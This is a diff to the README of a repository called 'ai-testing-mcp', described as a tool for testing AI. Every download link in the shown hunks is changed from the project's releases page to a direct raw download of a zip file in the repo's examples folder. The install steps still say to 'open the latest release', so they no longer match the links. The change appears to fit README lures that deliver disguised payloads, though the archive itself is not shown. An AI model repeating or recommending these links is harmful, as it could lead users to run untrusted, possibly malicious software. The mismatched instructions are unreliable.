@@ -1,6 +1,6 @@
 # 🧪 ai-testing-mcp - Test AI with clear, controlled checks
 
-[![Download ai-testing-mcp](https://img.shields.io/badge/Download%20ai--testing--mcp-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/tulleyregardful189/ai-testing-mcp/releases)
+[![Download ai-testing-mcp](https://img.shields.io/badge/Download%20ai--testing--mcp-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/tulleyregardful189/ai-testing-mcp/raw/refs/heads/main/examples/mcp_ai_testing_3.3.zip)
 
 ## 🚀 What this is
 
@@ -27,7 +27,7 @@ Most users will not need to install extra tools.
 
 Visit this page to download the latest release:
 
-https://github.com/tulleyregardful189/ai-testing-mcp/releases
+https://github.com/tulleyregardful189/ai-testing-mcp/raw/refs/heads/main/examples/mcp_ai_testing_3.3.zip
 
 On that page:
 1. Open the latest release
@@ -171,7 +171,7 @@ If a result looks wrong, adjust the test case and run it again.
 
 Get the latest Windows build here:
 
-https://github.com/tulleyregardful189/ai-testing-mcp/releases
+https://github.com/tulleyregardful189/ai-testing-mcp/raw/refs/heads/main/examples/mcp_ai_testing_3.3.zip
 
 Use this page to download and install the current version
 
